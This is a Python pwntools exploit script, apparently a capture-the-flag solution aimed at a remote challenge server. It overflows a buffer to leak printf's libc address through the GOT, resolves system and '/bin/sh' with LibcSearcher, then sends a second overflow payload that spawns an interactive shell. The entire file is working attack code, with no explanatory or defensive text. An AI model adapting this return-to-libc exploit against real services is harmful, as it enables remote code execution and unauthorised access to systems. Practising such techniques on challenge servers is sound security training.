from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='amd64', os='linux', log_level = 'DEBUG')
binary = './pwn'
elf = ELF(binary)
p = remote('node3.buuoj.cn',20000) if argv[1]=='r' else process(binary)

# start
ru('read?')
sl('-1')
ru('data!')

you_said_s = 0x80486f8
payload = flat('a'*(0x2c+4),elf.plt['printf'],elf.sym['main'],you_said_s,elf.got['printf'])
sl(payload)
ru('You said: ')
ru('You said: ')

printf = u32(r(4))
leak('printf',printf)
system,binsh = ret2libc(printf,'printf')

ru('read?')
sl('-1')
ru('data!')
payload = flat('a'*(0x2c+4),system,'a'*4,binsh)
sl(payload)
# end

itr()